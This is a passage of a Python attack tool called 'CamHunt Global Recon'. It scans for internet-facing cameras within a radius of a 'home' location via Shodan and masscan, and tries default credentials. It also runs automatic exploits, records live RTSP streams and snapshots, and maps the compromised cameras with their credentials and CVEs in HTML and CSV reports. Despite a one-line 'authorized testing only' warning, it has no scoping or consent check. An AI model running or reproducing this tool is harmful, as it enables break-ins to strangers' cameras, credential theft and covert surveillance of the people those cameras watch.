    def _quick_port_check(self, ip: str, port: int) -> Optional[Dict]:
        """Quick TCP port check"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SCAN_CONFIG['timeout'])
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                with self.lock:
                    self.scanned_ips.add(ip)
                return {'ip': ip, 'port': port, 'status': 'open'}
            return None
        except:
            return None
    
    def phase_3_deep_probe(self):
        """Phase 3: Deep probe each potential camera"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"🔍 PHASE 3: DEEP CAMERA PROBING")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        # Collect all IPs to probe
        probe_ips = set()
        
        # From Shodan
        for cam in self.shodan_results:
            probe_ips.add(cam.ip)
        
        # From masscan
        for result in self.massscan_results:
            probe_ips.add(result['ip'])
        
        print(f"{Colors.BOLD}[*] Deep probing {len(probe_ips)} potential camera hosts...{Colors.ENDC}")
        
        with ThreadPoolExecutor(max_workers=SCAN_CONFIG['max_threads']) as executor:
            futures = {executor.submit(self._deep_probe_host, ip): ip for ip in probe_ips}
            
            for future in as_completed(futures):
                try:
                    cam = future.result()
                    if cam:
                        with self.lock:
                            self.cameras.append(cam)
                except:
                    continue
        
        # Sort by distance
        self.cameras.sort(key=lambda c: GeoEngine.calculate_distance(
            HOME_COORDS['lat'], HOME_COORDS['lng'], c.lat, c.lng))
        
        print(f"\n{Colors.OKGREEN}[+] Total cameras confirmed: {len(self.cameras)}{Colors.ENDC}")
    
    def _deep_probe_host(self, ip: str) -> Optional[CameraDevice]:
        """Deep probe a single host"""
        try:
            cam = CameraDevice(ip=ip, port=0, last_seen=datetime.now().isoformat())
            
            # Check if host is alive
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if sock.connect_ex((ip, 80)) != 0 and sock.connect_ex((ip, 554)) != 0:
                sock.close()
                return None
            sock.close()
            
            # Try HTTP on common ports
            for port in [80, 8080, 443, 8000, 8888, 5000, 7001, 7443]:
                result = self.detector.probe_http(ip, port)
                if result.get('is_camera') and not result.get('error'):
                    cam.port = port
                    cam.http_port = port
                    cam.vendor = result.get('vendor', '')
                    cam.http_title = result.get('title', '')
                    cam.http_body_snippet = result.get('body_snippet', '')[:200]
                    
                    # Try ONVIF
                    cam.onvif_detected = self.detector.detect_onvif(ip, port)
                    
                    # Try default credentials
                    creds = self.detector.try_default_credentials(ip, port, cam.vendor)
                    cam.default_creds = creds
                    
                    break
            
            # Try RTSP
            rtsp_result = self.detector.probe_rtsp(ip, 554)
            if rtsp_result.get('available'):
                if not cam.port:
                    cam.port = 554
                if not cam.vendor:
                    cam.vendor = 'Generic RTSP'
            
            # If camera detected, return it
            if cam.port:
                return cam
            
            return None
        
        except Exception as e:
            return None
    
    def phase_4_exploit(self):
        """Phase 4: Auto-exploitation"""
        if not EXPLOIT_CONFIG['auto_exploit']:
            return
        
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"💀 PHASE 4: AUTO-EXPLOITATION")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        print(f"{Colors.BOLD}[*] Attempting exploits on {len(self.cameras)} cameras...{Colors.ENDC}\n")
        
        for cam in self.cameras:
            print(f"{Colors.OKCYAN}[>] Exploiting {cam.ip} ({cam.vendor}){Colors.ENDC}")
            exploit_results = self.exploiter.exploit_camera(cam)
            
            if exploit_results['exploited']:
                cam.cves = [e.get('cve', '') for e in exploit_results['exploited']]
                cam.is_live = True
                
                for exp in exploit_results['exploited']:
                    print(f"  {Colors.OKGREEN}✓ {exp['name']}: {exp['description']}{Colors.ENDC}")
                    if exp.get('snapshot'):
                        print(f"    📸 Snapshot saved: {exp['snapshot']}{Colors.ENDC}")
            else:
                print(f"  {Colors.DIM}✗ No exploits found{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}[+] Exploitation phase complete{Colors.ENDC}")
    
    def phase_5_stream_capture(self):
        """Phase 5: Auto-capture RTSP streams"""
        if not EXPLOIT_CONFIG['auto_capture_rtsp']:
            return
        
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"📹 PHASE 5: STREAM CAPTURE & RECORDING")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        print(f"{Colors.BOLD}[*] Attempting to capture streams from {len(self.cameras)} cameras...{Colors.ENDC}\n")
        
        for cam in self.cameras:
            print(f"{Colors.OKCYAN}[>] Capturing {cam.ip} ({cam.vendor or 'Unknown'}){Colors.ENDC}")
            streams = self.stream_capture.capture_rtsp_automated(cam)
            
            if streams:
                cam.is_live = True
                for stream in streams:
                    print(f"  {Colors.OKGREEN}✓ Captured: {stream['file']} ({stream['size']/1024:.1f} KB){Colors.ENDC}")
            else:
                print(f"  {Colors.DIM}✗ No RTSP stream accessible{Colors.ENDC}")
    
    def phase_6_report(self):
        """Phase 6: Generate comprehensive report"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"📊 PHASE 6: REPORT GENERATION")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_dir = f"camhunt_report_{timestamp}"
        os.makedirs(report_dir, exist_ok=True)
        
        # Generate JSON report
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'home_coords': HOME_COORDS,
                'radius_km': SCAN_CONFIG['radius_km'],
                'total_cameras': len(self.cameras),
                'shodan_results': len(self.shodan_results),
                'masscan_results': len(self.masscan_results),
                'scanned_ips': len(self.scanned_ips),
            },
            'cameras': [cam.to_dict() for cam in self.cameras],
            'statistics': self._calculate_statistics(),
        }
        
        with open(f"{report_dir}/camera_report.json", 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Generate HTML report with map
        self._generate_html_report(report_dir, report)
        
        # Generate CSV for easy analysis
        self._generate_csv_report(report_dir)
        
        # Copy snapshots
        if os.path.exists('camera_snapshots'):
            import shutil
            shutil.copytree('camera_snapshots', f"{report_dir}/snapshots", dirs_exist_ok=True)
        
        if os.path.exists('captured_streams'):
            shutil.copytree('captured_streams', f"{report_dir}/streams", dirs_exist_ok=True)
        
        print(f"{Colors.OKGREEN}[+] Reports saved to: {report_dir}/{Colors.ENDC}")
        print(f"  📄 JSON: {report_dir}/camera_report.json")
        print(f"  📊 HTML Map: {report_dir}/camera_map.html")
        print(f"  📋 CSV: {report_dir}/camera_report.csv")
        print(f"  📸 Snapshots: {report_dir}/snapshots/")
        print(f"  🎥 Streams: {report_dir}/streams/")
        
        # Print summary
        self._print_summary()
    
    def _calculate_statistics(self) -> Dict:
        """Calculate scan statistics"""
        vendors = {}
        countries = {}
        total_live = sum(1 for c in self.cameras if c.is_live)
        total_exploited = sum(1 for c in self.cameras if c.cves)
        total_creds = sum(1 for c in self.cameras if c.default_creds)
        
        for cam in self.cameras:
            if cam.vendor:
                vendors[cam.vendor] = vendors.get(cam.vendor, 0) + 1
            if cam.country:
                countries[cam.country] = countries.get(cam.country, 0) + 1
        
        return {
            'total_cameras': len(self.cameras),
            'live_streams': total_live,
            'exploited': total_exploited,
            'default_creds_found': total_creds,
            'vendors': dict(sorted(vendors.items(), key=lambda x: x[1], reverse=True)[:10]),
            'countries': dict(sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]),
            'distance_stats': self._distance_statistics(),
        }
    
    def _distance_statistics(self) -> Dict:
        """Calculate distance statistics"""
        distances = []
        for cam in self.cameras:
            dist = GeoEngine.calculate_distance(
                HOME_COORDS['lat'], HOME_COORDS['lng'], 
                cam.lat, cam.lng
            )
            if dist > 0:
                distances.append(dist)
        
        if distances:
            return {
                'min_km': min(distances),
                'max_km': max(distances),
                'avg_km': sum(distances) / len(distances),
                'closest_5_km': sum(1 for d in distances if d <= 5),
                'closest_10_km': sum(1 for d in distances if d <= 10),
                'closest_50_km': sum(1 for d in distances if d <= 50),
            }
        return {}
    
    def _generate_html_report(self, report_dir: str, report: Dict):
        """Generate interactive HTML report with Leaflet map"""
        html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CamHunt Global Recon Report</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
               background: #0a0a0f; color: #e0e0e0; }
        .header { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                  padding: 30px; text-align: center; border-bottom: 3px solid #e94560; }
        .header h1 { color: #e94560; font-size: 2.5em; text-transform: uppercase; 
                     letter-spacing: 3px; text-shadow: 0 0 20px rgba(233,69,96,0.5); }
        .header .subtitle { color: #888; margin-top: 10px; font-size: 1.1em; }
        .stats-bar { display: flex; justify-content: center; gap: 30px; padding: 20px;
                     background: #1a1a2e; flex-wrap: wrap; }
        .stat-item { text-align: center; padding: 10px 25px; 
                     background: rgba(233,69,96,0.1); border-radius: 10px;
                     border: 1px solid rgba(233,69,96,0.3); min-width: 120px; }
        .stat-item .number { color: #e94560; font-size: 2em; font-weight: bold; }
        .stat-item .label { color: #888; font-size: 0.85em; margin-top: 5px; }
        #map { height: 500px; margin: 20px; border-radius: 10px; 
               border: 2px solid #333; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .section-title { color: #e94560; font-size: 1.5em; margin: 30px 0 20px;
                        border-bottom: 2px solid #333; padding-bottom: 10px; }
        .camera-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
                       gap: 20px; }
        .camera-card { background: #1a1a2e; border-radius: 10px; padding: 20px;
                       border: 1px solid #333; transition: all 0.3s; }
        .camera-card:hover { border-color: #e94560; transform: translateY(-3px); 
                             box-shadow: 0 10px 30px rgba(233,69,96,0.2); }
        .camera-card .ip { color: #e94560; font-size: 1.2em; font-weight: bold; }
        .camera-card .vendor { color: #0f3460; background: #e94560; padding: 2px 8px;
                              border-radius: 5px; font-size: 0.8em; display: inline-block; }
        .camera-card .info { margin-top: 10px; color: #aaa; font-size: 0.9em; }
        .camera-card .info span { display: block; margin: 3px 0; }
        .camera-card .creds { color: #4ecca3; font-weight: bold; }
        .camera-card .exploited { color: #e94560; font-weight: bold; }
        .camera-card .badge { display: inline-block; padding: 3px 8px; border-radius: 5px;
                             font-size: 0.75em; margin: 2px; }
        .badge-live { background: #4ecca3; color: #1a1a2e; }
        .badge-exploit { background: #e94560; color: white; }
        .badge-creds { background: #ffd93d; color: #1a1a2e; }
        .footer { text-align: center; padding: 30px; color: #555; 
                  border-top: 1px solid #333; margin-top: 40px; }
        .live-indicator { color: #4ecca3; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="header">
        <h1><i class="fas fa-eye"></i> CamHunt Global Recon</h1>
        <div class="subtitle">
            <i class="fas fa-map-marker-alt"></i> Home: """ + f"{HOME_COORDS['lat']}, {HOME_COORDS['lng']}" + """ |
            <i class="fas fa-expand-arrows-alt"></i> Radius: """ + f"{SCAN_CONFIG['radius_km']} km" + """ |
            <i class="fas fa-calendar"></i> """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """
        </div>
    </div>
    
    <div class="stats-bar">
        <div class="stat-item">
            <div class="number">""" + str(len(self.cameras)) + """</div>
            <div class="label"><i class="fas fa-camera"></i> Total Cameras</div>
        </div>
        <div class="stat-item">
            <div class="number">""" + str(sum(1 for c in self.cameras if c.is_live)) + """</div>
            <div class="label"><i class="fas fa-video"></i> Live Streams</div>
        </div>
        <div class="stat-item">
            <div class="number">""" + str(sum(1 for c in self.cameras if c.cves)) + """</div>
            <div class="label"><i class="fas fa-bug"></i> Exploited</div>
        </div>
        <div class="stat-item">
            <div class="number">""" + str(sum(1 for c in self.cameras if c.default_creds)) + """</div>
            <div class="label"><i class="fas fa-key"></i> Default Creds</div>
        </div>
        <div class="stat-item">
            <div class="number">""" + str(len(self.shodan_results)) + """</div>
            <div class="label"><i class="fas fa-satellite"></i> Shodan Hits</div>
        </div>
        <div class="stat-item">
            <div class="number">""" + str(len(self.scanned_ips)) + """</div>
            <div class="label"><i class="fas fa-network-wired"></i> IPs Scanned</div>
        </div>
    </div>
    
    <div id="map"></div>
    
    <div class="container">
        <h2 class="section-title"><i class="fas fa-list"></i> Camera Inventory</h2>
        <div class="camera-grid">
"""
        # Add camera cards
        for i, cam in enumerate(self.cameras):
            dist = GeoEngine.calculate_distance(HOME_COORDS['lat'], HOME_COORDS['lng'], cam.lat, cam.lng)
            
            badges = ''
            if cam.is_live:
                badges += '<span class="badge badge-live"><i class="fas fa-circle live-indicator"></i> LIVE</span> '
            if cam.cves:
                badges += '<span class="badge badge-exploit"><i class="fas fa-skull"></i> EXPLOITED</span> '
            if cam.default_creds:
                badges += '<span class="badge badge-creds"><i class="fas fa-key"></i> CREDS</span> '
            
            creds_str = ', '.join([f"{u}:{p}" for u, p in cam.default_creds[:2]]) if cam.default_creds else 'None'
            cve_str = ', '.join(cam.cves[:3]) if cam.cves else 'None'
            
            html_content += f"""
            <div class="camera-card" onclick="map.flyTo([{cam.lat}, {cam.lng}], 15)">
                <div class="ip"><i class="fas fa-camera"></i> {cam.ip}</div>
                <div style="margin-top: 8px;">{badges}</div>
                <div class="info">
                    <span><i class="fas fa-tag"></i> Vendor: <strong>{cam.vendor or 'Unknown'}</strong></span>
                    <span><i class="fas fa-map-pin"></i> Location: {cam.city}, {cam.country} ({dist:.1f} km)</span>
                    <span><i class="fas fa-plug"></i> Port: {cam.port} | HTTP: {cam.http_port}</span>
                    <span><i class="fas fa-wifi"></i> ISP: {cam.isp or 'N/A'}</span>
                    <span class="creds"><i class="fas fa-key"></i> Creds: {creds_str}</span>
                    <span class="exploited"><i class="fas fa-bug"></i> CVEs: {cve_str}</span>
                    <span><i class="fas fa-globe"></i> ONVIF: {'Yes' if cam.onvif_detected else 'No'}</span>
                </div>
            </div>
"""
        
        html_content += """
        </div>
    </div>
    
    <div class="footer">
        <p><i class="fas fa-shield-alt"></i> CamHunt Global Recon v3.0 | Authorized Security Assessment Tool</p>
        <p style="margin-top: 5px; font-size: 0.9em;">Generated: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """</p>
    </div>
    
    <script>
        // Initialize map
        var map = L.map('map').setView([""" + f"{HOME_COORDS['lat']}, {HOME_COORDS['lng']}" + """], 12);
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors',
            maxZoom: 18
        }).addTo(map);
        
        // Home marker
        var homeIcon = L.divIcon({
            className: 'home-marker',
            html: '<i class="fas fa-home" style="color: #4ecca3; font-size: 24px; text-shadow: 0 0 10px #4ecca3;"></i>',
            iconSize: [30, 30],
            iconAnchor: [15, 15]
        });
        
        L.marker([""" + f"{HOME_COORDS['lat']}, {HOME_COORDS['lng']}" + """], {icon: homeIcon})
            .addTo(map)
            .bindPopup('<b>📍 Home Base</b><br>Scan Center');
        
        // Draw radius circle
        L.circle([""" + f"{HOME_COORDS['lat']}, {HOME_COORDS['lng']}" + """], {
            radius: """ + str(SCAN_CONFIG['radius_km'] * 1000) + """,
            color: '#e94560',
            fillColor: '#e94560',
            fillOpacity: 0.05,
            weight: 2,
            dashArray: '10, 10'
        }).addTo(map);
        
        // Camera markers
        var cameras = """ + json.dumps([{
            'ip': c.ip, 'lat': c.lat, 'lng': c.lng, 'vendor': c.vendor,
            'city': c.city, 'country': c.country, 'port': c.port,
            'is_live': c.is_live, 'has_creds': len(c.default_creds) > 0,
            'has_cves': len(c.cves) > 0, 'dist': GeoEngine.calculate_distance(
                HOME_COORDS['lat'], HOME_COORDS['lng'], c.lat, c.lng)
        } for c in self.cameras]) + """;
        
        cameras.forEach(function(cam) {
            if (cam.lat && cam.lng && cam.lat != 0) {
                var color = cam.is_live ? '#4ecca3' : (cam.has_cves ? '#e94560' : '#ffd93d');
                var icon = L.divIcon({
                    className: 'cam-marker',
                    html: '<i class="fas fa-video" style="color: ' + color + '; font-size: 16px; text-shadow: 0 0 8px ' + color + ';"></i>',
                    iconSize: [20, 20],
                    iconAnchor: [10, 10]
                });
                
                var popupContent = '<b>📷 ' + cam.ip + '</b><br>' +
                    'Vendor: ' + (cam.vendor || 'Unknown') + '<br>' +
                    'Port: ' + cam.port + '<br>' +
                    'Location: ' + (cam.city || 'N/A') + ', ' + (cam.country || 'N/A') + '<br>' +
                    'Distance: ' + cam.dist.toFixed(1) + ' km<br>' +
                    (cam.is_live ? '<span style="color:#4ecca3;">🔴 LIVE</span><br>' : '') +
                    (cam.has_creds ? '<span style="color:#ffd93d;">🔑 Default Credentials</span><br>' : '') +
                    (cam.has_cves ? '<span style="color:#e94560;">💀 Exploitable</span>' : '');
                
                L.marker([cam.lat, cam.lng], {icon: icon})
                    .addTo(map)
                    .bindPopup(popupContent);
            }
        });
        
        // Heatmap-like clustering would go here with additional library
    </script>
</body>
</html>
"""
        
        with open(f"{report_dir}/camera_map.html", 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Colors.OKGREEN}[+] HTML Map Report generated{Colors.ENDC}")
    
    def _generate_csv_report(self, report_dir: str):
        """Generate CSV report"""
        import csv
        
        with open(f"{report_dir}/camera_report.csv", 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'IP', 'Port', 'Vendor', 'Model', 'City', 'Country', 'ISP',
                'Latitude', 'Longitude', 'Distance_km', 'HTTP_Port', 
                'ONVIF', 'Is_Live', 'Stream_URL', 'Default_Creds',
                'CVEs', 'HTTP_Title'
            ])
            
            for cam in self.cameras:
                dist = GeoEngine.calculate_distance(
                    HOME_COORDS['lat'], HOME_COORDS['lng'], 
                    cam.lat, cam.lng
                )
                writer.writerow([
                    cam.ip, cam.port, cam.vendor, cam.model,
                    cam.city, cam.country, cam.isp,
                    cam.lat, cam.lng, f"{dist:.2f}",
                    cam.http_port, 'Yes' if cam.onvif_detected else 'No',
                    'Yes' if cam.is_live else 'No',
                    cam.stream_url,
                    '; '.join([f"{u}:{p}" for u, p in cam.default_creds]),
                    '; '.join(cam.cves),
                    cam.http_title
                ])
    
    def _print_summary(self):
        """Print scan summary to console"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"📊 SCAN SUMMARY")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        print(f"{Colors.BOLD}📡 Intelligence Sources:{Colors.ENDC}")
        print(f"  • Shodan: {len(self.shodan_results)} camera signals detected")
        print(f"  • Masscan: {len(self.masscan_results)} open ports found")
        print(f"  • Deep Probe: {len(self.cameras)} cameras confirmed")
        
        print(f"\n{Colors.BOLD}📷 Camera Statistics:{Colors.ENDC}")
        print(f"  • Total cameras: {Colors.OKGREEN}{len(self.cameras)}{Colors.ENDC}")
        print(f"  • Live streams: {Colors.OKGREEN}{sum(1 for c in self.cameras if c.is_live)}{Colors.ENDC}")
        print(f"  • Exploitable: {Colors.FAIL}{sum(1 for c in self.cameras if c.cves)}{Colors.ENDC}")
        print(f"  • Default creds: {Colors.WARNING}{sum(1 for c in self.cameras if c.default_creds)}{Colors.ENDC}")
        
        # Vendor breakdown
        vendors = {}
        for c in self.cameras:
            v = c.vendor or 'Unknown'
            vendors[v] = vendors.get(v, 0) + 1
        
        if vendors:
            print(f"\n{Colors.BOLD}🏭 Vendor Breakdown:{Colors.ENDC}")
            for vendor, count in sorted(vendors.items(), key=lambda x: x[1], reverse=True)[:10]:
                bar = '█' * count
                print(f"  • {vendor:20s}: {count:3d} {Colors.DIM}{bar}{Colors.ENDC}")
        
        # Distance breakdown
        stats = self._calculate_statistics().get('distance_stats', {})
        if stats:
            print(f"\n{Colors.BOLD}📍 Distance Analysis:{Colors.ENDC}")
            print(f"  • Closest: {stats.get('closest_5_km', 0)} within 5km")
            print(f"  • Nearby: {stats.get('closest_10_km', 0)} within 10km")
            print(f"  • Regional: {stats.get('closest_50_km', 0)} within 50km")
            print(f"  • Min distance: {stats.get('min_km', 0):.1f} km")
            print(f"  • Max distance: {stats.get('max_km', 0):.1f} km")
            print(f"  • Avg distance: {stats.get('avg_km', 0):.1f} km")
        
        # Top 5 closest cameras
        if self.cameras:
            print(f"\n{Colors.BOLD}🔴 TOP 5 CLOSEST CAMERAS:{Colors.ENDC}")
            for i, cam in enumerate(self.cameras[:5], 1):
                dist = GeoEngine.calculate_distance(HOME_COORDS['lat'], HOME_COORDS['lng'], cam.lat, cam.lng)
                creds_str = f" 🔑{len(cam.default_creds)} creds" if cam.default_creds else ""
                exploit_str = f" 💀{len(cam.cves)} CVEs" if cam.cves else ""
                live_str = " 🔴LIVE" if cam.is_live else ""
                print(f"  {i}. {cam.ip:15s} | {cam.vendor or 'Unknown':12s} | {dist:6.1f} km{creds_str}{exploit_str}{live_str}")
        
        print(f"\n{Colors.HEADER}{'═'*65}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}✅ Scan Complete! Check the report directory for full results.{Colors.ENDC}")
        print(f"{Colors.HEADER}{'═'*65}{Colors.ENDC}\n")
    
    def run(self):
        """Main execution"""
        self.print_banner()
        
        start_time = time.time()
        
        # Phase 1: Shodan Intelligence
        self.phase_1_shodan_intel()
        
        # Phase 2: Masscan
        self.phase_2_mass_scan()
        
        # Phase 3: Deep Probe
        self.phase_3_deep_probe()
        
        # Phase 4: Exploit
        self.phase_4_exploit()
        
        # Phase 5: Stream Capture
        self.phase_5_stream_capture()
        
        # Phase 6: Report
        self.phase_6_report()
        
        elapsed = time.time() - start_time
        print(f"\n{Colors.DIM}Total execution time: {elapsed:.1f} seconds{Colors.ENDC}")


# ===================== MAIN ENTRY POINT =====================

def install_dependencies():
    """Install required dependencies"""
    deps = [
        'shodan', 'requests', 'folium', 
    ]
    
    print(f"{Colors.BOLD}[*] Checking dependencies...{Colors.ENDC}")
    
    for dep in deps:
        try:
            __import__(dep.replace('-', '_'))
            print(f"  {Colors.OKGREEN}✓ {dep}{Colors.ENDC}")
        except ImportError:
            print(f"  {Colors.WARNING}⚠ Installing {dep}...{Colors.ENDC}")
            subprocess.run([sys.executable, '-m', 'pip', 'install', dep, '-q'],
                          capture_output=True)
    
    # Check system tools
    system_tools = ['masscan', 'nmap', 'ffmpeg', 'ffprobe']
    for tool in system_tools:
        try:
            subprocess.run([tool, '--version'], capture_output=True, timeout=5)
            print(f"  {Colors.OKGREEN}✓ {tool}{Colors.ENDC}")
        except:
            print(f"  {Colors.WARNING}⚠ {tool} not found. Some features disabled.{Colors.ENDC}")


def main():
    """Entry point"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Install dependencies
    install_dependencies()
    
    print(f"\n{Colors.BOLD}{Colors.HEADER}╔══════════════════════════════════════════════════════════════╗")
    print(f"║  {Colors.WARNING}⚡ CamHunt Global Recon - Initializing...{Colors.HEADER}                  ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
    
    # Configuration check
    if API_CONFIG['shodan']['api_key'] == 'YOUR_SHODAN_API_KEY':
        print(f"{Colors.WARNING}[!] Shodan API key not configured!{Colors.ENDC}")
        print(f"    Get a free API key at: https://account.shodan.io/register")
        print(f"    Or the tool will still work with local network scanning.\n")
    
    # Ask for coordinates
    print(f"{Colors.OKCYAN}[?] Use default coordinates ({HOME_COORDS['lat']}, {HOME_COORDS['lng']})? (Y/n): {Colors.ENDC}", end='')
    choice = input().strip().lower()
    if choice in ['n', 'no']:
        try:
            print(f"  Enter latitude: ", end='')
            HOME_COORDS['lat'] = float(input().strip())
            print(f"  Enter longitude: ", end='')
            HOME_COORDS['lng'] = float(input().strip())
        except:
            print(f"{Colors.WARNING}[!] Invalid input. Using defaults.{Colors.ENDC}")
    
    # Ask for radius
    print(f"{Colors.OKCYAN}[?] Scan radius in km (default: {SCAN_CONFIG['radius_km']}): {Colors.ENDC}", end='')
    try:
        radius = input().strip()
        if radius:
            SCAN_CONFIG['radius_km'] = float(radius)
    except:
        pass
    
    print(f"\n{Colors.BOLD}[✓] Configuration:{Colors.ENDC}")
    print(f"  📍 Center: {HOME_COORDS['lat']}, {HOME_COORDS['lng']}")
    print(f"  📏 Radius: {SCAN_CONFIG['radius_km']} km")
    print(f"  🌐 Area: ~{3.14159 * SCAN_CONFIG['radius_km']**2:.0f} km²")
    print(f"  🔧 Threads: {SCAN_CONFIG['max_threads']}")
    print(f"  💀 Auto-Exploit: {'ON' if EXPLOIT_CONFIG['auto_exploit'] else 'OFF'}")
    print(f"  📹 Stream Capture: {'ON' if EXPLOIT_CONFIG['auto_capture_rtsp'] else 'OFF'}")
    
    print(f"\n{Colors.WARNING}{Colors.BOLD}⚠ WARNING: This tool is for authorized security testing only!{Colors.ENDC}")
    print(f"{Colors.DIM}  Unauthorized use may violate computer fraud laws.{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}[✓] Starting scan... (Press Ctrl+C to stop){Colors.ENDC}")
    time.sleep(2)
    
    # Run the scanner
    scanner = CamHuntGlobalRecon()
    scanner.run()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user.{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Fatal error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
